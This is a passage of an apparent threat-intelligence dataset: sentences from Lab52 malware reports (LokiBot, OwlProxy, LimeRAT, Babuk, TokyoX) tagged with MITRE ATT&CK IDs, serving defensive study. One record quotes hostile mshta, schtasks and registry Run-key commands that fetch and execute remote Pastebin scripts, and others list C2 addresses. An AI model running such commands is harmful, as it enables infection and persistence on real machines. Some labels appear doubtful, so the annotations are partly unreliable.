"lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "This macro have the following slightly obfuscated code:", "labels": ["T1027", "T1059"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "If we look at the content of those two variables, we can see that they contain the following string: \u201cmshta.exe https://j.]mp/kasasjdoopoopasdskdd\u201d, which causes the legitimate Windows interpreter \u201cmshta\u201d to execute a script hosted on the web that follows.", "labels": ["T1218"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "In fact, this address only redirects to the following link in Pastebin: https://pastebin.com/mqRZ7CBC, which contains the following obfuscated script:", "labels": ["T1027"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "| \u2018id1run mshta.exe \u201chttps://pastebin.com\\raw\\ZnhyvWAU\u201drun schtasks.exe \u201cC:\\Windows\\System32\\schtasks.exe\u201d /create /sc MINUTE /mo 60 /tn \u201cxesefiliym\u201d /tr \u201cmshta.exe \u201chttps://pastebin.com\\raw\\ZnhyvWAU\u201d /F\u2018id2run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\trats2di => mshta.exe \u201chttps://pastebin.com\\raw\\d7kxMSZd\u201d\u2018id3run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ => mshta.exe \u201chttps://pastebin.com\\raw\\VJDyrCD2\u201d\u2018defidrun mshta.exe \u201chttps://pastebin.com\\raw\\9dva5i24\u201drun reg add HKCU\\\\Software\\\\Microsoft\\\\Windows notepad\\\\CurrentVersion\\\\Run\\\\rednefed => mshta.exe \u201chttps://pastebin.com\\raw\\9dva5i24\u201d |", "labels": ["T1053", "T1053"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "Basically, the script consists of the execution of two other Pastebin mshta scripts, and the creation of persistence of these two, plus another two extra in the registry and in the programmed tasks of the system, causing that in each reboot, there are 4 scripts being downloaded from Pastebin and executed on the computer.", "labels": ["T1218", "T1547"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "The execution of each of the 4 scripts is preceded by one of the following identifiers \u201c**id1**, **id2**, **id3** and **defid**\u201c.", "labels": ["T1059"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "Since the script executed by **id1** is the most complex, we will leave it for the end of the post and we will focus first on the other 3 in order of complexity.", "labels": ["T1059"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "**id2** consists of a small script in powershell, which runs on every reboot and stays in a loop checking everything copied to the Windows clipboard.", "labels": ["T1059", "T1547", "T1115"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "In case that the copied string is a Bitcoin address, it replaces it with the attacker\u2019s Bitcoin address, in order to make the user deposit money into the actor\u2019s account:", "labels": ["T1115"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "**Defid**, on the other hand, points to another script, which downloads from Pastebin a base64 encoded file, which has been inverted and where the \u201c0\u201d characters have been replaced by the \u201c.character in order to make its analysis more difficult:", "labels": ["T1027", "T1105", "TA0005"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "After sorting and decoding it, we obtain a small executable developed in .Net and without obfuscation whose only purpose is to drop in the system a .vbs file that disables a large number of system security policies, including those of Windows Defender and MS Office.", "labels": ["T1140", "T1562"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "In terms of capabilities, mainly what it does is download two other executables developed in .Net with obfuscation techniques similar to those of the \u201c**Defid**\u201d executable.", "labels": ["T1105"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "Once downloaded and deobfuscated, it loads them with \u201c[System.Reflection.Assembly]::Load(XXX)\u201d which allows him to directly call functions within these binaries from PowerShell.", "labels": ["T1059", "T1620"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "After this, it downloads **a third executable** from Pastebin, decodes it and stores it in a variable that it calls $Cli2 and loads the second executable, also in .Net, and calls its function \u201cChris()\u201d passing as parameters the string \u201cnotepad.exe\u201d and the variable that contains the third executable.", "labels": ["T1105", "T1140", "T1105"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "This second binary just loaded, after being analyzed in the same way as the AMSI Bypass DLL, is used to inject in a **non** .Net executable inside another process that is not .Net either.", "labels": ["T1055"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "That is, it creates a legitimate notepad process, and injects into it the third binary it has downloaded.", "labels": ["T1055"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "This last binary, consists of a sample of the Bot/Stealer LokiBot, practically unpacked, which at this point, is in a system without most of its protection measures.", "labels": ["S0447"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "It is interesting that, up to this point, this campaign coincides in many points with [the following report](https://isc.sans.edu/forums/diary/AgentTesla+Delivered+via+a+Malicious+PowerPoint+AddIn/26162) related to an AgentTesla infection campaign, but as in this case, the final threat is not developed in .Net, they have had to add this last extra loader, in order to inject malware developed in other languages, in other processes.", "labels": ["S0331", "S0331", "T1055"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "The sample command and control server is \u201chttp://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM\u201d and although its main function is to act as a stealer, as it focuses on stealing credentials from all types of mail clients, FTP, browsers and many other services, it also acts as a bot, allowing some control over the computer by the actor behind this threat.", "labels": ["T1041", "T1055", "T1555"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "Updates on OwlProxy malware", "labels": [], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "During the analysis of some malicious artifacts collected from an incident, we have recently detected a sample that has caught our attention, the sample was deployed on a server exposed to the Internet and was packed with \u201cVMProtect\u201d.", "labels": ["T1027"], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "After analyzing this malware sample we could see that it was a recent version of a tool known as OwlProxy, which has been detected on targets hit by the APT group known as Chimera.", "labels": ["G0114"], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "The use of \u201cVMProtect\u201d by the actors makes the analysis of their code more time-consuming (although it simplifies its detection since this is already an anomaly by itself).", "labels": ["T1027"], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "On the other hand, this packer has some weaknesses such as the fact that it does not always protect part of the binary metadata and that once in memory, it does not obfuscate most of the strings, which makes these elements of the executable relatively easy to analyze once in memory.", "labels": ["T1027"], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "From some of these strings, it can be seen how new samples are being uploaded regularly, which after a more detailed analysis have been identified as different 32-bit and 64-bit versions of the same threat, some of them packaged and others not.", "labels": ["T1027"], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "A summary of its capabilities can be found in this report, which explains that it acts as a proxy between the DMZ of the victim\u2019s infrastructure and its internal network and also allows the execution of commands remotely.", "labels": ["TA0011"], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "In the case of the samples analyzed, instead of using port 80, they are exposing the port 443 using SSL and they have stopped using the string \u201cservlet\u201d and now they have different strings depending on the sample in question, they have kept the string \u201cpp\u201d for the endpoint that acts as proxy.", "labels": ["T1071"], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "Two of them are newer versions of this same 32-bit and 64-bit tool and the third one is an installer or dropper (9A9FFDB8FC20B6E6E6E5A1DE434F6B834E69755FD62157F91884E9A681F0073256) that when executed, depending on the operating system architecture, extracts from its resources a suitable OwlProxy sample for the architecture in question, installs it in system32 with the name \u201cwmipd.dll\u201d, gives it the same creation and modification date as \u201ccalc.exe\u201d and creates a service named wmipd that runs it at every system startup.", "labels": ["T1036", "T1547"], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "The OwlProxy sample of its resources is split into reverse ordered blocks, so the MZ header, for example, is in the last 2634 bytes of the file.", "labels": [], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "Along with the fact that these also use \u201chttps\u201d as protocol, and that they have again changed part of the path of their endpoints to use \u201cexchangetopicservices\u201d (probable evolution of the 2019 samples that use the string \u201ctopics\u201d), they have added a new endpoint to the tool, as follows:", "labels": ["T1547"], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "| https://+:443/exchangetopicservices/px/ | Webshell |", "labels": ["T1059"], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "The rest do match their names since \u201cget\\_directory\u201d can be used to list the contents of a directory and \u201cupload\\_file\u201d is used to drop a file on the remote server.", "labels": ["T1083"], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "| DEE3A502AEDCBE109373AA200A690D4E2D1A10FA3CF69A7B6DB68A78C6ABFC2C | Old OwlProxy x64 version |", "labels": [], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "| 75E616BF87AD0CBE738C4C48BC0ECD114871DEF145E21545FA11705D3A11D60E | Old OwlProxy x64 version |", "labels": [], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "| 16CF6924ECA8208AD9D9B8470CF0A849995ED4D981D5BC706E62AE878EF261BB | Recent OwlProxy x86 version |", "labels": [], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "| C9B8CFACC859E494984AE9DDF864314AF651FD32E60F33C7F42BFC640620E8CA | Recent OwlProxy x64 version |", "labels": [], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "| 95E7E09468F7DC62DA42E036B6E36CE27DC04C2CA0BB86A2FED39B3CC2BF4A97 | VMProtect OwlProxy x64 version |", "labels": [], "document": "lab52_2021-04-29_chimera-apt-updates-on-its"}, {"sentence": "Literature lover targeting Colombia with LimeRAT", "labels": [], "document": "lab52_2021-05-17_literature-lover-targeting-colombia-with"}, {"sentence": "This actor is starting the infection via email with very generic topics such as subpoenas or bank payments, with a crafted html view where the icon pretending to be an attachment is in fact an image with a link to download a compressed file from One Drive.", "labels": ["T1566", "T1566"], "document": "lab52_2021-05-17_literature-lover-targeting-colombia-with"}, {"sentence": "![](https://lab52.io/blog/wp-content/uploads/2021/05/phichin-1024x506.png)Phishing emails serving same malicious sample", "labels": ["T1566"], "document": "lab52_2021-05-17_literature-lover-targeting-colombia-with"}, {"sentence": "The .rar file contains a Visual Basic Script with same name \u201ccitacion juzgado.vbs\u201d which, poorly obfuscated, will create a Windows Script Host Shell Object to download and execute a new Powershell script by executing the following command:", "labels": ["T1059", "T1027", "T1059", "T1105"], "document": "lab52_2021-05-17_literature-lover-targeting-colombia-with"}, {"sentence": "We are starting to witness how attackers are using legitimate domains such as discord or twitter, to download some malicious payload, or even legitimate cloud services such as One Drive or DropBox to host different samples.", "labels": ["T1105"], "document": "lab52_2021-05-17_literature-lover-targeting-colombia-with"}, {"sentence": "Basically, this Powershell script will download a series of other different scripts which will be dropped in \u201cC:\\Users\\Public\\\u201d and \u201cC:\\ProgramData\\Microsoft Arts\\Start\\\u201d, and establish persistence using the Registry Key \u201cHKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\u201d.", "labels": ["T1105", "T1547", "T1105"], "document": "lab52_2021-05-17_literature-lover-targeting-colombia-with"}, {"sentence": "Infection Chain Among these different scripts, most of them trying to disable typical AntiVirus solutions, there is one implementing a technique a little more advanced than the rest of the techniques, known as Reflection Assembly, and consisting of the creation of binary payloads as byte arrays in Powershell and then loading them using a puppet process injection within the memory of process \u201cC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe\u201d as shown in the following screenshot, or in \u201cC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\u201d, depending on the results of some previous checks.", "labels": ["T1562", "T1055"], "document": "lab52_2021-05-17_literature-lover-targeting-colombia-with"}, {"sentence": "According to [360 Total Security researchers](https://blog.360totalsecurity.com/en/new-infection-chain-of-njrat-variant/), some similar techniques were spotted loading a Delphi version of the njRAT in July 2020, by what it seemed to be an Arabic speaker actor.", "labels": ["S0385"], "document": "lab52_2021-05-17_literature-lover-targeting-colombia-with"}, {"sentence": "Even though in both cases the binary files have resulted in Dynamic Libraries and same loading technique, in this occasion both binaries were identified as written in .NET. Furthermore, the RAT used in this scenario was Lime-RAT, a modified version of njRAT.", "labels": ["S0385"], "document": "lab52_2021-05-17_literature-lover-targeting-colombia-with"}, {"sentence": "When taking a closer look at the final stage in order to identify the final Command and Control server, we found another interesting element.", "labels": ["TA0011"], "document": "lab52_2021-05-17_literature-lover-targeting-colombia-with"}, {"sentence": "Despite having seen the string \u201cALOSH\u201d repetitively through the different stages, suggesting that this could be an individual going by this nickname, it is worth mentioning the fact that the APT group referred as APT-C-36, or Blind Eagle, have been spotted many times using this same toolset including LimeRAT, targeting same geographic area through phishing emails written in perfect Spanish, and also using Duckdns as part of their infrastructure.", "labels": ["G0099", "G0099", "T1566"], "document": "lab52_2021-05-17_literature-lover-targeting-colombia-with"}, {"sentence": "After a quick research on previous DNS resolutions of the final C2, we could identify related documents contacting the same IP, referring to Colombia and the use of the word \u201cCacha\u201d, which could be a way of saying \u201cfriend\u201d or \u201cbrother\u201d in Colombia, among other meanings in Spanish.", "labels": ["TA0011"], "document": "lab52_2021-05-17_literature-lover-targeting-colombia-with"}, {"sentence": "Lastly, after another quick search on different binary executables contacting this same C2, we found different forms of packed malware samples using strings in Asian and Cyrillic encoding, with a noisier obfuscation.", "labels": ["TA0011", "T1027", "T1027"], "document": "lab52_2021-05-17_literature-lover-targeting-colombia-with"}, {"sentence": "The cached analysis in shodan.io would also show that the server might only have one port open at a time, which would support the idea of the attacker rotating ports for every campaign while reusing same C2 infrastructure.", "labels": ["TA0011"], "document": "lab52_2021-05-17_literature-lover-targeting-colombia-with"}, {"sentence": "C2 check in shodan.io", "labels": ["TA0011"], "document": "lab52_2021-05-17_literature-lover-targeting-colombia-with"}, {"sentence": "Quick review of Babuk ransomware builder", "labels": ["S0638", "T1486"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "Last week, the builder for the Babuk ransomware family was leaked online.", "labels": ["S0638", "T1486"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "After their recent official move from Ransomware as a Service to data leaks extortions, someone uploaded to [virusTotal](https://www.virustotal.com/gui/file/82e560a078cd7bb4472d5af832a04c4bc8f1001bac97b1574efe9863d3f66550) the ransomware builder for unknown reasons, and it was soon identified as such by British researcher [Kevin Beaumont](https://twitter.com/GossiTheDog/status/1409121823376117772).", "labels": ["T1486", "T1486", "TA0010"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "Content of Babuk builder leak", "labels": ["S0638"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "Babuk builder usage", "labels": ["S0638"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "Babuk builder output", "labels": ["S0638"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "After the successful execution, we get the two eliptic curve keys generated for encryption, 3 encryption executables for Windows, ARM-based NAS decives, and VMWare ESXi servers respectively, together with its corresponding decryption executables.", "labels": ["T1486"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "Babuk builder path bug", "labels": ["S0638"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "![](https://lab52.io/blog/wp-content/uploads/2021/07/050-1024x397.png)Comparison *between real Babuk sample and built sample*", "labels": ["S0638"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "We also compared the encryption timing between two samples, getting similar times, which would be a reinforcement about its authenticity since Babuk is Top 3 fastest [ransomware encryption speed](https://twitter.com/CryptoInsane/status/1408342272438005762/photo/2) since they updated their efficiency \u201cflaws\u201d identified by Chuong Dong during his [great analysis](https://chuongdong.com/reverse%20engineering/2021/01/16/BabukRansomware-v3/) of the three versions of Babuk.", "labels": ["S0638", "T1486", "S0638", "T1486", "T1486"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "![](https://lab52.io/blog/wp-content/uploads/2021/07/07.png) Not matching functions between real Babuk sample and built sample", "labels": ["S0638"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "![](https://lab52.io/blog/wp-content/uploads/2021/07/06-1.png) Partial matching functions real Babuk sample vs. built sample", "labels": ["S0638"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "![](https://lab52.io/blog/wp-content/uploads/2021/07/08.png)Perfect matching function from real Babuk sample vs. built sample", "labels": ["S0638"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "As it could be expected, the builder would take the content of note.txt and use it as the ransomware note that it would be dropped in the infected machines.", "labels": ["T1486"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "Since Babuk decided not to use any packing mechanism, we could also spot in clear text the ransom note and the rest of the space reserved for the ransomware note inside the built binaries.", "labels": ["S0638", "T1486"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "After this, we decided to take a deeper look into the actual builder executable, and we found out that we could pass as a second argument an actual eliptic curve encyption key, instead of letting the builder generate it for us, allowing the ransomware operator to use the same decryption executable for different builds.", "labels": ["T1486", "T1486"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "Argument parsing of Babuk builder", "labels": ["S0638"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "![](https://lab52.io/blog/wp-content/uploads/2021/07/12.png) Babuk builder read of binary files as Templates", "labels": ["S0638"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "![](https://lab52.io/blog/wp-content/uploads/2021/07/13.png) Babuk builder write of output binary files", "labels": ["S0638"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "Since Babuk binaries did not use any packer, anyone having these files and a deep knowledge about them, could have written this builder.", "labels": ["S0638"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "This could be considered important since new ransomware gangs could try to take advantage of this leak for their own Raas \u201cstartup\u201d.", "labels": ["T1486"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "However, it is also valuable for researchers since it will allow us to generate better detection rules, or even track new unofficial variations of the ransomware family.", "labels": ["T1486"], "document": "lab52_2021-07-05_quick-review-of-babuk-ransomware"}, {"sentence": "TokyoX: DLL side-loading an unknown artifact", "labels": ["T1574"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "During Christmas holidays, Lab52 has been analyzing a sample which loads an artifact that we have decided to refer to as \u201cTokyoX\u201d since no similarities have been found as to any known malware, which we usually detect in open sources.", "labels": [], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "Some antivirus engines tagged the sample as PlugX, but it seems that the attribution might be due to the final payload\u2019s loading mechanism: DLL sideloading with an encrypted payload in the same directory.", "labels": ["S0013", "T1574"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "After analyzing the final payload we could not find any similarities with other known samples from PlugX other than the loading TTPs.", "labels": ["S0013"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "The legitimate file Creative.exe, an encrypted Data file and the version.dll DLL, which implements the loader function for the Data file, and therefore responsible of mapping the \u201cTokyoX\u201d.", "labels": [], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "If we execute it from a path which is not final or the expected by the malware, it replicates to another path and executes from there, which is something it does have in common with some PlugX dll loaders:", "labels": ["S0013", "T1574"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "Once executed, we observe how the netsh.exe process tries to establish connections with port 443 of the IP address 31.192.107[.]187.", "labels": ["S0108", "T1071"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "In this analysis we will focus on different aspects about the process; from double-clicking the binary 123.exe process (which is a copy of Creative.exe but in another path) to the execution of \u201cTokyoX\u201d already decrypted in memory.", "labels": ["T1204", "T1140"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "After reading the file from disk, a child process netsh.exe is created.", "labels": ["S0108"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "This just-created child process is where several new memory segments will be located (a total of 5, including the final decrypted payload) to decrypt the final \u201cTokyoX\u201d payload.", "labels": ["T1140", "T1140"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "First, it creates two segments: 100Kb where the encrypted payload is located and which comes from the disc, and another one of 4Kb. In the 4Kb segment we observe how the following string is set (which will be the string used for the decrypting process):", "labels": ["T1055"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "The other memory segment of 100Kb contains the following (encrypted content, as we see how it matches the content from Data file on Disk):", "labels": ["T1055"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "After the creation of these two segments, a third segment is allocated, where it is loaded the absolute memory addresses from several win32 APIs (VirtualAlloc, LoadLibrary, GetProcAddress, the home address of the coded payload, etc.for its later use by the loader:", "labels": ["T1055", "T1129"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "We can notice how the segment will have the memory addresses (starting from 123.exe they are located in netsh.exe segment through the version.dll code):", "labels": ["T1055", "T1055"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "Then, another segment of 4Kb is created where it loads the code that will decrypt and load the final payload.", "labels": ["T1140", "T1055"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "Finally, the \u201cTokyoX\u201d loader runs from the DLL (version.dll) in netsh.exe through the API NtcreateThreadEx and we see the start of the last page created in the stack:", "labels": ["S0108", "T1129"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "After the execution of NtCreateThreadEx, as indicated, the loader is initiated in netsh.exe in the segment:", "labels": ["S0108", "T1546"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "Once the execution is moved to the netsh.exe process, it takes the string located in the initial 4Kb segment, copies it into the stack and replicates it (0x100, 256 bytes) to match the specific block size of 256bytes.", "labels": ["S0108", "T1546", "T1620"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "The combination of the blue block (in following image) and the 00-FF block (pointed in red in previous image) results in the following block in memory, marked in red in the image:", "labels": ["T1620"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "On the next step, the loader reads the initial argument, arg0, whose value is 0x900000 and points at the 4Kb block, which stores the absolute addresses to different API from Win32:", "labels": ["T1129"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "After this, the decrypting process for the final payload begins.", "labels": ["T1140"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "The decrypting process gets two values from the second block, exchanges and adds them, and the result serves as a final index to recover the element from the second block with which the xor will be achieved through the coded block.", "labels": ["T1140", "T1140"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "This description of the decryption algorythm has been identified as the **RC4 algorythm**.", "labels": ["T1140"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "After the decryption process, we find a PE binary, as seen in the following image.", "labels": ["T1055", "T1140"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "This creates another memory segment in the process netsh.exe with RWX licenses (that of 116Kb) which will be used to load the PE:", "labels": ["S0108", "T1055"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "In this new segment, it maps the binary using the virtual addresses as the regular Windows PE loader would do.", "labels": ["T1055"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "After the correct mapping and having loaded the necessary libraries for its proper functioning, it calls EAX to run the decrypted and mapped payload:", "labels": ["T1140"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "To summarize, this article goes through the process followed in memory after executing the Creative Cloud application until deploying TokyoX in memory.", "labels": [], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "This DLL sideloading style is often linked to APT groups whose attribution is also linked to China, however being a known technique as it is, we are not able to consider any feasible attribution at the moment.", "labels": ["T1574"], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "As reviewed at the beginning of the article, what we have named as \u201cTokyoX\u201d has not been identified as a known malware so far (at least, with the sources that we have).", "labels": [], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "Read the second part of the analysis of the final \u201cTokyoX\u201d RAT and its capacities [here](https://lab52.io/blog/tokyox-dll-side-loading-an-unknown-artifact-part-2/).", "labels": [], "document": "lab52_2022-01-10_tokyox-dll-side-loading-an"}, {"sentence": "TokyoX: DLL side-loading an unknown artifact (Part 2)", "labels": [], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "Thus, for the moment, we will keep referring to it as TokyoX.", "labels": [], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "After the whole loading process, the first thing the threat does is to check for the existence of a mutex in the system with the name \u201caftdoslm\u201d and if it finds it, it terminates its execution in order to avoid multiple instances of the threat running in parallel.", "labels": ["T1083"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "It then generates a 32-character string similar to a md5 hash from the computer\u2019s file system and Volume information, which is used as the victim ID and placed at the beginning of every packet it sends to the command and control server:", "labels": ["T1083", "TA0011"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "It then obtains the user name, computer name, local IP and operating system version, with which it builds a string and generates a first packet for the C2:", "labels": ["T1082", "TA0011", "T1033", "T1049"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "At the time of the analysis the command and control server was not available.", "labels": ["TA0011"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "However, from the analysis of the threat assembly, it has been possible to observe that the response of the C2 is very similar to those sent by the threat, since it most likely contains the first 44 bytes of the threat request or a very similar content: the victim ID (in red) , the first three dwords (in green).", "labels": ["TA0011"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "This command is not among the options accepted by the threat, but it is the one that the threat itself uses when it sends the first packet to the command and control server, and we assume that it is the one used as a beacon when it does not intend to do anything, since a command that is not supported by the switch statement will simply cause a 5-minute sleep and a new request to C2 after this time.", "labels": ["TA0011", "TA0011"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "Second comes the \u201c6011\u201d command which is relatively interesting since it first calls a function that will delete all the infection files and terminate the execution of the threat.", "labels": ["T1070"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "The fact that makes it interesting to us is that after this call, inside the switch that controls each command, it appears again as a command to perform no action (in this case it should be the 6010 probably) and make another request to C2, although this code will never be executed because the initial function will close the process.", "labels": ["TA0011"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "The next command is \u201c7010\u201d which scans the disks installed in the computer using the \u201cGetLogicalDriveStringsW\u201d API and sends the results to the command and control server.", "labels": ["T1041", "T1005"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "The command \u201c7011\u201d imitates the \u201cDir\u201d command as it receives after the code a folder path, and allows it to list the content of a folder, showing hidden and system files too.", "labels": ["T1005"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "The next command \u201c7017\u201d expects, after the command code, a structure with three dwords followed by a path with a filename, and allows to upload a file from the attacking computer to the victim machine.", "labels": ["T1105"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "In order to do so, it first creates an empty file and then generates a new thread that will make a second request to the command and control server.", "labels": ["TA0011"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "Within the response from the C2, this request expects the contents of the file to be uploaded, which the requesting thread will store in the file generated by the main thread.", "labels": ["TA0011", "TA0011"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "In this case, it generates a new thread that tries to read that file within the victim computer and makes a second request to the C2 containing the raw content, allowing the attacker to exfiltrate files from the infected computer.", "labels": ["TA0011", "T1041"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "Finally, there is the \u201c8001\u201d command with a command string to be run in a cmd.exe shell, since it calls CreateProcessW for \u201ccmd.exe\u201d with the input and output redirected by anonymous pipes to the executable itself.", "labels": ["T1059"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "Then, it executes the command received in the request and replies to the C2 with the output of that command, thus forming a remote Shell of the victim machine.", "labels": ["TA0011", "T1059", "T1059"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "Although **we do not have enough evidence to make any kind of attribution**, there are some characteristic TTPs in the infection chain: the attacker using a Dll-sideload with a legitimate binary and a library, the fact that the library is responsible for decrypting and executing a third encrypted file in memory, and the fact of removing the MZ characters from the beginning of the binary and replacing them with another string.", "labels": ["T1574"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "This last characteristic is very common in APT groups that use PlugX as the main threat, where instead of using \u201ctokyo\u201d to replace MZ, they usually add \u201cplug\u201d at the beginning, which has motivated the name of the threat.", "labels": ["S0013"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "All of 